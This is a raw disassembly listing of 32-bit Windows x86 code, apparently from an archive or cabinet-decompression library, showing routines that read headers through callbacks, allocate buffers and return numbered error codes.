 1007056:	66 3b 4d fc          	cmp    -0x4(%ebp),%cx
 100705a:	75 06                	jne    0x1007062
 100705c:	66 3b 45 fe          	cmp    -0x2(%ebp),%ax
 1007060:	74 09                	je     0x100706b
 1007062:	6a 00                	push   $0x0
 1007064:	6a 0a                	push   $0xa
 1007066:	e9 c1 01 00 00       	jmp    0x100722c
 100706b:	6a 09                	push   $0x9
 100706d:	8d 7b 50             	lea    0x50(%ebx),%edi
 1007070:	59                   	pop    %ecx
 1007071:	8d 75 dc             	lea    -0x24(%ebp),%esi
 1007074:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
 1007076:	33 ff                	xor    %edi,%edi
 1007078:	f6 43 6e 04          	testb  $0x4,0x6e(%ebx)
 100707c:	66 89 7d 08          	mov    %di,0x8(%ebp)
 1007080:	c6 45 0a 00          	movb   $0x0,0xa(%ebp)
 1007084:	c6 45 0b 00          	movb   $0x0,0xb(%ebp)
 1007088:	74 17                	je     0x10070a1
 100708a:	6a 04                	push   $0x4
 100708c:	8d 45 08             	lea    0x8(%ebp),%eax
 100708f:	50                   	push   %eax
 1007090:	ff b3 88 00 00 00    	push   0x88(%ebx)
 1007096:	ff 53 10             	call   *0x10(%ebx)
 1007099:	83 c4 0c             	add    $0xc,%esp
 100709c:	83 f8 04             	cmp    $0x4,%eax
 100709f:	75 57                	jne    0x10070f8
 10070a1:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
 10070a5:	39 83 a0 00 00 00    	cmp    %eax,0xa0(%ebx)
 10070ab:	74 29                	je     0x10070d6
 10070ad:	8b 43 4c             	mov    0x4c(%ebx),%eax
 10070b0:	3b c7                	cmp    %edi,%eax
 10070b2:	74 08                	je     0x10070bc
 10070b4:	50                   	push   %eax
 10070b5:	ff 53 04             	call   *0x4(%ebx)
 10070b8:	59                   	pop    %ecx
 10070b9:	89 7b 4c             	mov    %edi,0x4c(%ebx)
 10070bc:	0f b7 45 08          	movzwl 0x8(%ebp),%eax
 10070c0:	3b c7                	cmp    %edi,%eax
 10070c2:	89 83 a0 00 00 00    	mov    %eax,0xa0(%ebx)
 10070c8:	76 0c                	jbe    0x10070d6
 10070ca:	50                   	push   %eax
 10070cb:	ff 53 08             	call   *0x8(%ebx)
 10070ce:	3b c7                	cmp    %edi,%eax
 10070d0:	59                   	pop    %ecx
 10070d1:	89 43 4c             	mov    %eax,0x4c(%ebx)
 10070d4:	74 70                	je     0x1007146
 10070d6:	8b 83 a0 00 00 00    	mov    0xa0(%ebx),%eax
 10070dc:	3b c7                	cmp    %edi,%eax
 10070de:	76 20                	jbe    0x1007100
 10070e0:	50                   	push   %eax
 10070e1:	ff 73 4c             	push   0x4c(%ebx)
 10070e4:	ff b3 88 00 00 00    	push   0x88(%ebx)
 10070ea:	ff 53 10             	call   *0x10(%ebx)
 10070ed:	83 c4 0c             	add    $0xc,%esp
 10070f0:	39 83 a0 00 00 00    	cmp    %eax,0xa0(%ebx)
 10070f6:	74 08                	je     0x1007100
 10070f8:	57                   	push   %edi
 10070f9:	6a 02                	push   $0x2
 10070fb:	e9 2c 01 00 00       	jmp    0x100722c
 1007100:	0f b6 45 0a          	movzbl 0xa(%ebp),%eax
 1007104:	83 c0 08             	add    $0x8,%eax
 1007107:	39 7b 44             	cmp    %edi,0x44(%ebx)
 100710a:	75 14                	jne    0x1007120
 100710c:	50                   	push   %eax
 100710d:	89 83 a4 00 00 00    	mov    %eax,0xa4(%ebx)
 1007113:	ff 53 08             	call   *0x8(%ebx)
 1007116:	3b c7                	cmp    %edi,%eax
 1007118:	59                   	pop    %ecx
 1007119:	89 43 44             	mov    %eax,0x44(%ebx)
 100711c:	75 0a                	jne    0x1007128
 100711e:	eb 26                	jmp    0x1007146
 1007120:	3b 83 a4 00 00 00    	cmp    0xa4(%ebx),%eax
 1007126:	75 2e                	jne    0x1007156
 1007128:	0f b6 45 0b          	movzbl 0xb(%ebp),%eax
 100712c:	83 c0 08             	add    $0x8,%eax
 100712f:	39 7b 48             	cmp    %edi,0x48(%ebx)
 1007132:	75 1a                	jne    0x100714e
 1007134:	50                   	push   %eax
 1007135:	89 83 a8 00 00 00    	mov    %eax,0xa8(%ebx)
 100713b:	ff 53 08             	call   *0x8(%ebx)
 100713e:	3b c7                	cmp    %edi,%eax
 1007140:	59                   	pop    %ecx
 1007141:	89 43 48             	mov    %eax,0x48(%ebx)
 1007144:	75 18                	jne    0x100715e
 1007146:	57                   	push   %edi
 1007147:	6a 05                	push   $0x5
 1007149:	e9 de 00 00 00       	jmp    0x100722c
 100714e:	3b 83 a8 00 00 00    	cmp    0xa8(%ebx),%eax
 1007154:	74 08                	je     0x100715e
 1007156:	57                   	push   %edi
 1007157:	6a 09                	push   $0x9
 1007159:	e9 ce 00 00 00       	jmp    0x100722c
 100715e:	f6 43 6e 01          	testb  $0x1,0x6e(%ebx)
 1007162:	be 00 01 00 00       	mov    $0x100,%esi
 1007167:	74 2d                	je     0x1007196
 1007169:	53                   	push   %ebx
 100716a:	56                   	push   %esi
 100716b:	8d 83 b5 01 00 00    	lea    0x1b5(%ebx),%eax
 1007171:	50                   	push   %eax
 1007172:	e8 44 f8 ff ff       	call   0x10069bb
 1007177:	85 c0                	test   %eax,%eax
 1007179:	0f 84 b4 00 00 00    	je     0x1007233
 100717f:	53                   	push   %ebx
 1007180:	56                   	push   %esi
 1007181:	8d 83 b6 02 00 00    	lea    0x2b6(%ebx),%eax
 1007187:	50                   	push   %eax
 1007188:	e8 2e f8 ff ff       	call   0x10069bb
 100718d:	85 c0                	test   %eax,%eax
 100718f:	75 13                	jne    0x10071a4
 1007191:	e9 9d 00 00 00       	jmp    0x1007233
 1007196:	c6 83 b5 01 00 00 00 	movb   $0x0,0x1b5(%ebx)
 100719d:	c6 83 b6 02 00 00 00 	movb   $0x0,0x2b6(%ebx)
 10071a4:	f6 43 6e 02          	testb  $0x2,0x6e(%ebx)
 10071a8:	74 26                	je     0x10071d0
 10071aa:	53                   	push   %ebx
 10071ab:	56                   	push   %esi
 10071ac:	8d 83 b7 03 00 00    	lea    0x3b7(%ebx),%eax
 10071b2:	50                   	push   %eax
 10071b3:	e8 03 f8 ff ff       	call   0x10069bb
 10071b8:	85 c0                	test   %eax,%eax
 10071ba:	74 77                	je     0x1007233
 10071bc:	53                   	push   %ebx
 10071bd:	56                   	push   %esi
 10071be:	8d 83 b8 04 00 00    	lea    0x4b8(%ebx),%eax
 10071c4:	50                   	push   %eax
 10071c5:	e8 f1 f7 ff ff       	call   0x10069bb
 10071ca:	85 c0                	test   %eax,%eax
 10071cc:	75 10                	jne    0x10071de
 10071ce:	eb 63                	jmp    0x1007233
 10071d0:	c6 83 b7 03 00 00 00 	movb   $0x0,0x3b7(%ebx)
 10071d7:	c6 83 b8 04 00 00 00 	movb   $0x0,0x4b8(%ebx)
 10071de:	6a 01                	push   $0x1
 10071e0:	57                   	push   %edi
 10071e1:	ff b3 88 00 00 00    	push   0x88(%ebx)
 10071e7:	ff 53 1c             	call   *0x1c(%ebx)
 10071ea:	83 c4 0c             	add    $0xc,%esp
 10071ed:	83 f8 ff             	cmp    $0xffffffff,%eax
 10071f0:	89 43 2c             	mov    %eax,0x2c(%ebx)
 10071f3:	57                   	push   %edi
 10071f4:	74 15                	je     0x100720b
 10071f6:	ff 73 60             	push   0x60(%ebx)
 10071f9:	ff b3 88 00 00 00    	push   0x88(%ebx)
 10071ff:	ff 53 1c             	call   *0x1c(%ebx)
 1007202:	83 c4 0c             	add    $0xc,%esp
 1007205:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007208:	75 05                	jne    0x100720f
 100720a:	57                   	push   %edi
 100720b:	6a 04                	push   $0x4
 100720d:	eb 1d                	jmp    0x100722c
 100720f:	66 8b 43 6c          	mov    0x6c(%ebx),%ax
 1007213:	53                   	push   %ebx
 1007214:	66 89 83 ac 00 00 00 	mov    %ax,0xac(%ebx)
 100721b:	e8 b1 f5 ff ff       	call   0x10067d1
 1007220:	f7 d8                	neg    %eax
 1007222:	1b c0                	sbb    %eax,%eax
 1007224:	f7 d8                	neg    %eax
 1007226:	eb 0d                	jmp    0x1007235
 1007228:	6a 00                	push   $0x0
 100722a:	6a 01                	push   $0x1
 100722c:	ff 33                	push   (%ebx)
 100722e:	e8 81 06 00 00       	call   0x10078b4
 1007233:	33 c0                	xor    %eax,%eax
 1007235:	5f                   	pop    %edi
 1007236:	5e                   	pop    %esi
 1007237:	5b                   	pop    %ebx
 1007238:	c9                   	leave
 1007239:	c2 10 00             	ret    $0x10
 100723c:	cc                   	int3
 100723d:	cc                   	int3
 100723e:	cc                   	int3
 100723f:	cc                   	int3
 1007240:	cc                   	int3
 1007241:	8b ff                	mov    %edi,%edi
 1007243:	55                   	push   %ebp
 1007244:	8b ec                	mov    %esp,%ebp
 1007246:	53                   	push   %ebx
 1007247:	8b 5d 0c             	mov    0xc(%ebp),%ebx
 100724a:	56                   	push   %esi
 100724b:	8b 75 08             	mov    0x8(%ebp),%esi
 100724e:	8b 86 a4 00 00 00    	mov    0xa4(%esi),%eax
 1007254:	0f af c3             	imul   %ebx,%eax
 1007257:	03 46 2c             	add    0x2c(%esi),%eax
 100725a:	57                   	push   %edi
 100725b:	6a 00                	push   $0x0
 100725d:	50                   	push   %eax
 100725e:	ff b6 84 00 00 00    	push   0x84(%esi)
 1007264:	8d be e4 07 00 00    	lea    0x7e4(%esi),%edi
 100726a:	89 9e 90 00 00 00    	mov    %ebx,0x90(%esi)
 1007270:	ff 56 1c             	call   *0x1c(%esi)
 1007273:	83 c4 0c             	add    $0xc,%esp
 1007276:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007279:	0f 84 a1 00 00 00    	je     0x1007320
 100727f:	ff b6 a4 00 00 00    	push   0xa4(%esi)
 1007285:	ff 76 44             	push   0x44(%esi)
 1007288:	ff b6 84 00 00 00    	push   0x84(%esi)
 100728e:	ff 56 10             	call   *0x10(%esi)
 1007291:	83 c4 0c             	add    $0xc,%esp
 1007294:	39 86 a4 00 00 00    	cmp    %eax,0xa4(%esi)
 100729a:	0f 85 80 00 00 00    	jne    0x1007320
 10072a0:	8b 46 44             	mov    0x44(%esi),%eax
 10072a3:	6a 00                	push   $0x0
 10072a5:	ff 30                	push   (%eax)
 10072a7:	ff b6 84 00 00 00    	push   0x84(%esi)
 10072ad:	ff 56 1c             	call   *0x1c(%esi)
 10072b0:	83 c4 0c             	add    $0xc,%esp
 10072b3:	83 f8 ff             	cmp    $0xffffffff,%eax
 10072b6:	74 68                	je     0x1007320
 10072b8:	8b 46 44             	mov    0x44(%esi),%eax
 10072bb:	66 8b 48 04          	mov    0x4(%eax),%cx
 10072bf:	66 89 8e b0 00 00 00 	mov    %cx,0xb0(%esi)
 10072c6:	0f b7 40 06          	movzwl 0x6(%eax),%eax
 10072ca:	56                   	push   %esi
 10072cb:	50                   	push   %eax
 10072cc:	e8 73 fc ff ff       	call   0x1006f44
 10072d1:	85 c0                	test   %eax,%eax
 10072d3:	74 56                	je     0x100732b
 10072d5:	83 7e 28 00          	cmpl   $0x0,0x28(%esi)
 10072d9:	74 40                	je     0x100731b
 10072db:	c7 07 01 00 00 00    	movl   $0x1,(%edi)
 10072e1:	8b 46 38             	mov    0x38(%esi),%eax
 10072e4:	89 47 04             	mov    %eax,0x4(%edi)
 10072e7:	66 8b 86 a4 00 00 00 	mov    0xa4(%esi),%ax
 10072ee:	66 2d 08 00          	sub    $0x8,%ax
 10072f2:	66 89 47 0c          	mov    %ax,0xc(%edi)
 10072f6:	74 0b                	je     0x1007303
 10072f8:	8b 46 44             	mov    0x44(%esi),%eax
 10072fb:	83 c0 08             	add    $0x8,%eax
 10072fe:	89 47 08             	mov    %eax,0x8(%edi)
 1007301:	eb 04                	jmp    0x1007307
 1007303:	83 67 08 00          	andl   $0x0,0x8(%edi)
 1007307:	57                   	push   %edi
 1007308:	66 89 5f 0e          	mov    %bx,0xe(%edi)
 100730c:	ff 56 28             	call   *0x28(%esi)
 100730f:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007312:	59                   	pop    %ecx
 1007313:	75 06                	jne    0x100731b
 1007315:	6a 00                	push   $0x0
 1007317:	6a 0b                	push   $0xb
 1007319:	eb 09                	jmp    0x1007324
 100731b:	33 c0                	xor    %eax,%eax
 100731d:	40                   	inc    %eax
 100731e:	eb 0d                	jmp    0x100732d
 1007320:	6a 00                	push   $0x0
 1007322:	6a 04                	push   $0x4
 1007324:	ff 36                	push   (%esi)
 1007326:	e8 89 05 00 00       	call   0x10078b4
 100732b:	33 c0                	xor    %eax,%eax
 100732d:	5f                   	pop    %edi
 100732e:	5e                   	pop    %esi
 100732f:	5b                   	pop    %ebx
 1007330:	5d                   	pop    %ebp
 1007331:	c2 08 00             	ret    $0x8
 1007334:	cc                   	int3
 1007335:	cc                   	int3
 1007336:	cc                   	int3
 1007337:	cc                   	int3
 1007338:	cc                   	int3
 1007339:	8b ff                	mov    %edi,%edi
 100733b:	55                   	push   %ebp
 100733c:	8b ec                	mov    %esp,%ebp
 100733e:	51                   	push   %ecx
 100733f:	53                   	push   %ebx
 1007340:	56                   	push   %esi
 1007341:	8b 75 08             	mov    0x8(%ebp),%esi
 1007344:	66 8b 5e 72          	mov    0x72(%esi),%bx
 1007348:	33 c0                	xor    %eax,%eax
 100734a:	66 8b 46 70          	mov    0x70(%esi),%ax
 100734e:	57                   	push   %edi
 100734f:	8d be bc 07 00 00    	lea    0x7bc(%esi),%edi
 1007355:	8d 8e b7 03 00 00    	lea    0x3b7(%esi),%ecx
 100735b:	89 4f 04             	mov    %ecx,0x4(%edi)
 100735e:	8d 8e b8 04 00 00    	lea    0x4b8(%esi),%ecx
 1007364:	89 4f 08             	mov    %ecx,0x8(%edi)
 1007367:	8d 8e b9 05 00 00    	lea    0x5b9(%esi),%ecx
 100736d:	66 43                	inc    %bx
 100736f:	89 4f 0c             	mov    %ecx,0xc(%edi)
 1007372:	8b 4e 38             	mov    0x38(%esi),%ecx
 1007375:	83 67 24 00          	andl   $0x0,0x24(%edi)
 1007379:	89 45 fc             	mov    %eax,-0x4(%ebp)
 100737c:	89 4f 10             	mov    %ecx,0x10(%edi)
 100737f:	66 89 47 1e          	mov    %ax,0x1e(%edi)
 1007383:	66 89 5f 20          	mov    %bx,0x20(%edi)
 1007387:	8b 86 84 00 00 00    	mov    0x84(%esi),%eax
 100738d:	83 65 08 00          	andl   $0x0,0x8(%ebp)
 1007391:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007394:	74 09                	je     0x100739f
 1007396:	50                   	push   %eax
 1007397:	ff 56 18             	call   *0x18(%esi)
 100739a:	85 c0                	test   %eax,%eax
 100739c:	59                   	pop    %ecx
 100739d:	75 78                	jne    0x1007417
 100739f:	8b 86 88 00 00 00    	mov    0x88(%esi),%eax
 10073a5:	83 f8 ff             	cmp    $0xffffffff,%eax
 10073a8:	74 09                	je     0x10073b3
 10073aa:	50                   	push   %eax
 10073ab:	ff 56 18             	call   *0x18(%esi)
 10073ae:	85 c0                	test   %eax,%eax
 10073b0:	59                   	pop    %ecx
 10073b1:	75 64                	jne    0x1007417
 10073b3:	83 8e 88 00 00 00 ff 	orl    $0xffffffff,0x88(%esi)
 10073ba:	83 8e 84 00 00 00 ff 	orl    $0xffffffff,0x84(%esi)
 10073c1:	57                   	push   %edi
 10073c2:	6a 04                	push   $0x4
 10073c4:	ff 56 24             	call   *0x24(%esi)
 10073c7:	83 f8 ff             	cmp    $0xffffffff,%eax
 10073ca:	59                   	pop    %ecx
 10073cb:	59                   	pop    %ecx
 10073cc:	74 58                	je     0x1007426
 10073ce:	53                   	push   %ebx
 10073cf:	ff 75 fc             	push   -0x4(%ebp)
 10073d2:	8d 86 b7 03 00 00    	lea    0x3b7(%esi),%eax
 10073d8:	50                   	push   %eax
 10073d9:	56                   	push   %esi
 10073da:	e8 b7 fb ff ff       	call   0x1006f96
 10073df:	85 c0                	test   %eax,%eax
 10073e1:	74 0c                	je     0x10073ef
 10073e3:	6a 00                	push   $0x0
 10073e5:	56                   	push   %esi
 10073e6:	e8 56 fe ff ff       	call   0x1007241
 10073eb:	85 c0                	test   %eax,%eax
 10073ed:	75 0e                	jne    0x10073fd
 10073ef:	8b 06                	mov    (%esi),%eax
 10073f1:	83 38 0b             	cmpl   $0xb,(%eax)
 10073f4:	74 2c                	je     0x1007422
 10073f6:	c7 45 08 01 00 00 00 	movl   $0x1,0x8(%ebp)
 10073fd:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 1007401:	8b 06                	mov    (%esi),%eax
 1007403:	8b 00                	mov    (%eax),%eax
 1007405:	89 47 24             	mov    %eax,0x24(%edi)
 1007408:	0f 85 79 ff ff ff    	jne    0x1007387
 100740e:	66 ff 86 ae 00 00 00 	incw   0xae(%esi)
 1007415:	eb 2d                	jmp    0x1007444
 1007417:	6a 00                	push   $0x0
 1007419:	6a 04                	push   $0x4
 100741b:	ff 36                	push   (%esi)
 100741d:	e8 92 04 00 00       	call   0x10078b4
 1007422:	33 c0                	xor    %eax,%eax
 1007424:	eb 31                	jmp    0x1007457
 1007426:	6a 00                	push   $0x0
 1007428:	6a 0b                	push   $0xb
 100742a:	eb ef                	jmp    0x100741b
 100742c:	66 ff 8e ac 00 00 00 	decw   0xac(%esi)
 1007433:	66 ff 8e ae 00 00 00 	decw   0xae(%esi)
 100743a:	56                   	push   %esi
 100743b:	e8 b2 fa ff ff       	call   0x1006ef2
 1007440:	85 c0                	test   %eax,%eax
 1007442:	74 de                	je     0x1007422
 1007444:	66 83 be ae 00 00 00 	cmpw   $0x0,0xae(%esi)
 100744b:	00 
 100744c:	75 de                	jne    0x100742c
 100744e:	33 c0                	xor    %eax,%eax
 1007450:	40                   	inc    %eax
 1007451:	89 86 9c 00 00 00    	mov    %eax,0x9c(%esi)
 1007457:	5f                   	pop    %edi
 1007458:	5e                   	pop    %esi
 1007459:	5b                   	pop    %ebx
 100745a:	c9                   	leave
 100745b:	c2 04 00             	ret    $0x4
 100745e:	cc                   	int3
 100745f:	cc                   	int3
 1007460:	cc                   	int3
 1007461:	cc                   	int3
 1007462:	cc                   	int3
 1007463:	8b ff                	mov    %edi,%edi
 1007465:	55                   	push   %ebp
 1007466:	8b ec                	mov    %esp,%ebp
 1007468:	56                   	push   %esi
 1007469:	8b 75 08             	mov    0x8(%ebp),%esi
 100746c:	8b 46 48             	mov    0x48(%esi),%eax
 100746f:	0f b7 40 06          	movzwl 0x6(%eax),%eax
 1007473:	01 46 30             	add    %eax,0x30(%esi)
 1007476:	66 83 be b0 00 00 00 	cmpw   $0x0,0xb0(%esi)
 100747d:	00 
 100747e:	75 0a                	jne    0x100748a
 1007480:	56                   	push   %esi
 1007481:	e8 b3 fe ff ff       	call   0x1007339
 1007486:	85 c0                	test   %eax,%eax
 1007488:	74 70                	je     0x10074fa
 100748a:	66 ff 8e b0 00 00 00 	decw   0xb0(%esi)
 1007491:	6a 00                	push   $0x0
 1007493:	56                   	push   %esi
 1007494:	e8 e2 f3 ff ff       	call   0x100687b
 1007499:	85 c0                	test   %eax,%eax
 100749b:	74 5d                	je     0x10074fa
 100749d:	8b 46 48             	mov    0x48(%esi),%eax
 10074a0:	66 83 78 06 00       	cmpw   $0x0,0x6(%eax)
 10074a5:	75 23                	jne    0x10074ca
 10074a7:	56                   	push   %esi
 10074a8:	e8 8c fe ff ff       	call   0x1007339
 10074ad:	85 c0                	test   %eax,%eax
 10074af:	74 49                	je     0x10074fa
 10074b1:	8b 46 48             	mov    0x48(%esi),%eax
 10074b4:	0f b7 40 04          	movzwl 0x4(%eax),%eax
 10074b8:	50                   	push   %eax
 10074b9:	56                   	push   %esi
 10074ba:	e8 bc f3 ff ff       	call   0x100687b
 10074bf:	85 c0                	test   %eax,%eax
 10074c1:	74 37                	je     0x10074fa
 10074c3:	66 ff 8e b0 00 00 00 	decw   0xb0(%esi)
 10074ca:	8b 46 48             	mov    0x48(%esi),%eax
 10074cd:	0f b7 40 06          	movzwl 0x6(%eax),%eax
 10074d1:	89 45 08             	mov    %eax,0x8(%ebp)
 10074d4:	8d 45 08             	lea    0x8(%ebp),%eax
 10074d7:	50                   	push   %eax
 10074d8:	56                   	push   %esi
 10074d9:	e8 ca f8 ff ff       	call   0x1006da8
 10074de:	85 c0                	test   %eax,%eax
 10074e0:	74 18                	je     0x10074fa
 10074e2:	8b 46 48             	mov    0x48(%esi),%eax
 10074e5:	66 8b 4d 08          	mov    0x8(%ebp),%cx
 10074e9:	66 3b 48 06          	cmp    0x6(%eax),%cx
 10074ed:	74 0f                	je     0x10074fe
 10074ef:	6a 00                	push   $0x0
 10074f1:	6a 07                	push   $0x7
 10074f3:	ff 36                	push   (%esi)
 10074f5:	e8 ba 03 00 00       	call   0x10078b4
 10074fa:	33 c0                	xor    %eax,%eax
 10074fc:	eb 03                	jmp    0x1007501
 10074fe:	33 c0                	xor    %eax,%eax
 1007500:	40                   	inc    %eax
 1007501:	5e                   	pop    %esi
 1007502:	5d                   	pop    %ebp
 1007503:	c2 04 00             	ret    $0x4
 1007506:	cc                   	int3
 1007507:	cc                   	int3
 1007508:	cc                   	int3
 1007509:	cc                   	int3
 100750a:	cc                   	int3
 100750b:	8b ff                	mov    %edi,%edi
 100750d:	55                   	push   %ebp
 100750e:	8b ec                	mov    %esp,%ebp
 1007510:	57                   	push   %edi
 1007511:	8b 7d 08             	mov    0x8(%ebp),%edi
 1007514:	83 bf 9c 00 00 00 00 	cmpl   $0x0,0x9c(%edi)
 100751b:	74 05                	je     0x1007522
 100751d:	33 c0                	xor    %eax,%eax
 100751f:	40                   	inc    %eax
 1007520:	eb 49                	jmp    0x100756b
 1007522:	56                   	push   %esi
 1007523:	8b 75 0c             	mov    0xc(%ebp),%esi
 1007526:	b8 fe ff 00 00       	mov    $0xfffe,%eax
 100752b:	8b ce                	mov    %esi,%ecx
 100752d:	23 c8                	and    %eax,%ecx
 100752f:	3b c8                	cmp    %eax,%ecx
 1007531:	75 05                	jne    0x1007538
 1007533:	0f b7 77 6a          	movzwl 0x6a(%edi),%esi
 1007537:	4e                   	dec    %esi
 1007538:	39 b7 90 00 00 00    	cmp    %esi,0x90(%edi)
 100753e:	74 27                	je     0x1007567
 1007540:	57                   	push   %edi
 1007541:	e8 f7 f7 ff ff       	call   0x1006d3d
 1007546:	85 c0                	test   %eax,%eax
 1007548:	74 15                	je     0x100755f
 100754a:	56                   	push   %esi
 100754b:	57                   	push   %edi
 100754c:	e8 f0 fc ff ff       	call   0x1007241
 1007551:	85 c0                	test   %eax,%eax
 1007553:	74 0a                	je     0x100755f
 1007555:	57                   	push   %edi
 1007556:	e8 08 ff ff ff       	call   0x1007463
 100755b:	85 c0                	test   %eax,%eax
 100755d:	75 04                	jne    0x1007563
 100755f:	33 c0                	xor    %eax,%eax
 1007561:	eb 07                	jmp    0x100756a
 1007563:	83 67 30 00          	andl   $0x0,0x30(%edi)
 1007567:	33 c0                	xor    %eax,%eax
 1007569:	40                   	inc    %eax
 100756a:	5e                   	pop    %esi
 100756b:	5f                   	pop    %edi
 100756c:	5d                   	pop    %ebp
 100756d:	c2 08 00             	ret    $0x8
 1007570:	cc                   	int3
 1007571:	cc                   	int3
 1007572:	cc                   	int3
 1007573:	cc                   	int3
 1007574:	cc                   	int3
 1007575:	8b ff                	mov    %edi,%edi
 1007577:	55                   	push   %ebp
 1007578:	8b ec                	mov    %esp,%ebp
 100757a:	53                   	push   %ebx
 100757b:	56                   	push   %esi
 100757c:	8b 75 08             	mov    0x8(%ebp),%esi
 100757f:	8b 46 74             	mov    0x74(%esi),%eax
 1007582:	85 c0                	test   %eax,%eax
 1007584:	57                   	push   %edi
 1007585:	0f 84 a7 00 00 00    	je     0x1007632
 100758b:	8b 5e 78             	mov    0x78(%esi),%ebx
 100758e:	3b 5e 30             	cmp    0x30(%esi),%ebx
 1007591:	89 45 08             	mov    %eax,0x8(%ebp)
 1007594:	73 0a                	jae    0x10075a0
 1007596:	c7 86 90 00 00 00 ff 	movl   $0xffff,0x90(%esi)
 100759d:	ff 00 00 
 10075a0:	0f b7 46 7c          	movzwl 0x7c(%esi),%eax
 10075a4:	50                   	push   %eax
 10075a5:	56                   	push   %esi
 10075a6:	e8 60 ff ff ff       	call   0x100750b
 10075ab:	eb 06                	jmp    0x10075b3
 10075ad:	56                   	push   %esi
 10075ae:	e8 b0 fe ff ff       	call   0x1007463
 10075b3:	85 c0                	test   %eax,%eax
 10075b5:	74 5f                	je     0x1007616
 10075b7:	8b 46 48             	mov    0x48(%esi),%eax
 10075ba:	0f b7 40 06          	movzwl 0x6(%eax),%eax
 10075be:	03 46 30             	add    0x30(%esi),%eax
 10075c1:	3b d8                	cmp    %eax,%ebx
 10075c3:	73 e8                	jae    0x10075ad
 10075c5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
 10075c9:	74 67                	je     0x1007632
 10075cb:	8b 4e 48             	mov    0x48(%esi),%ecx
 10075ce:	0f b7 79 06          	movzwl 0x6(%ecx),%edi
 10075d2:	8b c3                	mov    %ebx,%eax
 10075d4:	2b 46 30             	sub    0x30(%esi),%eax
 10075d7:	2b f8                	sub    %eax,%edi
 10075d9:	3b 7d 08             	cmp    0x8(%ebp),%edi
 10075dc:	76 03                	jbe    0x10075e1
 10075de:	8b 7d 08             	mov    0x8(%ebp),%edi
 10075e1:	8b 4e 40             	mov    0x40(%esi),%ecx
 10075e4:	57                   	push   %edi
 10075e5:	03 c8                	add    %eax,%ecx
 10075e7:	51                   	push   %ecx
 10075e8:	ff b6 8c 00 00 00    	push   0x8c(%esi)
 10075ee:	ff 56 14             	call   *0x14(%esi)
 10075f1:	83 c4 0c             	add    $0xc,%esp
 10075f4:	3b f8                	cmp    %eax,%edi
 10075f6:	75 13                	jne    0x100760b
 10075f8:	03 df                	add    %edi,%ebx
 10075fa:	29 7d 08             	sub    %edi,0x8(%ebp)
 10075fd:	74 33                	je     0x1007632
 10075ff:	56                   	push   %esi
 1007600:	e8 5e fe ff ff       	call   0x1007463
 1007605:	85 c0                	test   %eax,%eax
 1007607:	75 c2                	jne    0x10075cb
 1007609:	eb 0b                	jmp    0x1007616
 100760b:	6a 00                	push   $0x0
 100760d:	6a 08                	push   $0x8
 100760f:	ff 36                	push   (%esi)
 1007611:	e8 9e 02 00 00       	call   0x10078b4
 1007616:	8d be 8c 00 00 00    	lea    0x8c(%esi),%edi
 100761c:	8b 07                	mov    (%edi),%eax
 100761e:	83 f8 ff             	cmp    $0xffffffff,%eax
 1007621:	74 08                	je     0x100762b
 1007623:	50                   	push   %eax
 1007624:	ff 56 18             	call   *0x18(%esi)
 1007627:	83 0f ff             	orl    $0xffffffff,(%edi)
 100762a:	59                   	pop    %ecx
 100762b:	33 c0                	xor    %eax,%eax
 100762d:	e9 8d 00 00 00       	jmp    0x10076bf
 1007632:	8d 86 bc 07 00 00    	lea    0x7bc(%esi),%eax
 1007638:	8d 8e b4 00 00 00    	lea    0xb4(%esi),%ecx
 100763e:	89 48 04             	mov    %ecx,0x4(%eax)
 1007641:	8b 8e 8c 00 00 00    	mov    0x8c(%esi),%ecx
 1007647:	89 48 14             	mov    %ecx,0x14(%eax)
 100764a:	66 8b 4e 7e          	mov    0x7e(%esi),%cx
 100764e:	66 89 48 18          	mov    %cx,0x18(%eax)
 1007652:	66 8b 8e 80 00 00 00 	mov    0x80(%esi),%cx
 1007659:	66 89 48 1a          	mov    %cx,0x1a(%eax)
 100765d:	66 8b 8e 82 00 00 00 	mov    0x82(%esi),%cx
 1007664:	66 89 48 1c          	mov    %cx,0x1c(%eax)
 1007668:	8b 4e 38             	mov    0x38(%esi),%ecx
 100766b:	89 48 10             	mov    %ecx,0x10(%eax)
 100766e:	66 8b 4e 7c          	mov    0x7c(%esi),%cx
 1007672:	83 20 00             	andl   $0x0,(%eax)
 1007675:	33 ff                	xor    %edi,%edi
 1007677:	66 89 48 22          	mov    %cx,0x22(%eax)
 100767b:	66 8b 48 1c          	mov    0x1c(%eax),%cx
 100767f:	47                   	inc    %edi
 1007680:	f6 c1 40             	test   $0x40,%cl
 1007683:	74 0b                	je     0x1007690
 1007685:	66 81 e1 bf ff       	and    $0xffbf,%cx
 100768a:	89 38                	mov    %edi,(%eax)
 100768c:	66 89 48 1c          	mov    %cx,0x1c(%eax)
 1007690:	50                   	push   %eax
 1007691:	6a 03                	push   $0x3
 1007693:	ff 56 24             	call   *0x24(%esi)
 1007696:	83 8e 8c 00 00 00 ff 	orl    $0xffffffff,0x8c(%esi)
 100769d:	83 f8 ff             	cmp    $0xffffffff,%eax
 10076a0:	59                   	pop    %ecx
 10076a1:	59                   	pop    %ecx
 10076a2:	75 10                	jne    0x10076b4
 10076a4:	6a 00                	push   $0x0
 10076a6:	6a 0b                	push   $0xb
 10076a8:	ff 36                	push   (%esi)
 10076aa:	e8 05 02 00 00       	call   0x10078b4
 10076af:	e9 77 ff ff ff       	jmp    0x100762b
 10076b4:	85 c0                	test   %eax,%eax
 10076b6:	75 05                	jne    0x10076bd
 10076b8:	50                   	push   %eax
 10076b9:	6a 08                	push   $0x8
 10076bb:	eb eb                	jmp    0x10076a8
 10076bd:	8b c7                	mov    %edi,%eax
 10076bf:	5f                   	pop    %edi
 10076c0:	5e                   	pop    %esi
 10076c1:	5b                   	pop    %ebx
 10076c2:	5d                   	pop    %ebp
 10076c3:	c2 04 00             	ret    $0x4
 10076c6:	cc                   	int3
 10076c7:	cc                   	int3
 10076c8:	cc                   	int3
 10076c9:	cc                   	int3
 10076ca:	cc                   	int3
 10076cb:	8b ff                	mov    %edi,%edi
 10076cd:	55                   	push   %ebp
 10076ce:	8b ec                	mov    %esp,%ebp
 10076d0:	51                   	push   %ecx
